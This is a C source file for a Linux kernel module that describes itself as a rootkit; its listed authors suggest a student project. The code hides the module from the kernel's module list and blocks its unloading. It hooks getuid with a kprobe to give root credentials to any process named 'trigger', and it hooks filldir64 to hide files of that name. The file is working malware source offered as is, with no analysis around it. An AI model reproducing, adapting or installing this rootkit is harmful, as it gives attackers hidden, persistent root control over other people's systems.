#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
MODULE_DESCRIPTION("Rootkit -> Privilege escalation, file hiding, and LKM hiding");
MODULE_VERSION("0.01");

// Function prototypes
void showme(void);
void hideme(void);
void protect(void);
void unprotect(void);
void set_root(void);

// Hide LKM variables and functions
static struct list_head *prev_module;
static short hidden = 0;

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);
    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);
    is_protected = 0;
}

// Privilege escalation variables and functions
static struct kprobe kp_getuid;
static struct kprobe kp_filldir64;

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();
    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static int handler_pre_getuid(struct kprobe *p, struct pt_regs *regs)
{
    const char *target_cmd = "trigger";
    char comm[TASK_COMM_LEN];

    get_task_comm(comm, current);

    if (strcmp(comm, target_cmd) == 0) {
        // printk(KERN_INFO "rootkit: Granting root privileges for process %s...\n", comm);
        set_root();
    }

    return 0;
}

static void handler_post_getuid(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    if (regs->si == 0) {
        regs->ax = 0;
    }
}

static int handler_pre_filldir64(struct kprobe *p, struct pt_regs *regs)
{
    char *filename = (char *)regs->si;
    int ret;
    // printk(KERN_INFO "rootkit: filldir64 called with filename: %s\n", filename);

    if ((ret = strcmp(filename, "trigger")) == 0) {
        regs->dx = 0;
    }
    return 0;
}

// Module initialization and cleanup
static int __init rootkit_init(void)
{
    int ret;

    // Hide LKM
    hideme();
    // protect LKM
    protect();

    // Privilege escalation
    kp_getuid.symbol_name = "__x64_sys_getuid";
    kp_getuid.pre_handler = handler_pre_getuid;
    kp_getuid.post_handler = handler_post_getuid;

    ret = register_kprobe(&kp_getuid);
    if (ret < 0) {
        // printk(KERN_ERR "rootkit: Failed to register kprobe for getuid, returned %d\n", ret);
        return ret;
    }

    // printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp_getuid.symbol_name);

    // File hiding
    kp_filldir64.symbol_name = "filldir64";
    kp_filldir64.pre_handler = handler_pre_filldir64;

    ret = register_kprobe(&kp_filldir64);
    if (ret < 0) {
        // printk(KERN_ERR "rootkit: Failed to register kprobe for filldir64, returned %d\n", ret);
        unregister_kprobe(&kp_getuid);
        return ret;
    }

    // printk(KERN_INFO "rootkit: Kprobe registered at %s and %s \n", kp_filldir64.symbol_name, kp_getuid.symbol_name);

    return 0;
}

static void __exit rootkit_exit(void)
{
    // Unregister kprobes
    unregister_kprobe(&kp_getuid);
    // printk(KERN_INFO "rootkit: Kprobe for getuid unregistered\n");

    unregister_kprobe(&kp_filldir64);
    // printk(KERN_INFO "rootkit: Kprobe for filldir64 unregistered\n");

    // Show LKM
    showme();
    unprotect();
}

module_init(rootkit_init);
module_exit(rootkit_exit);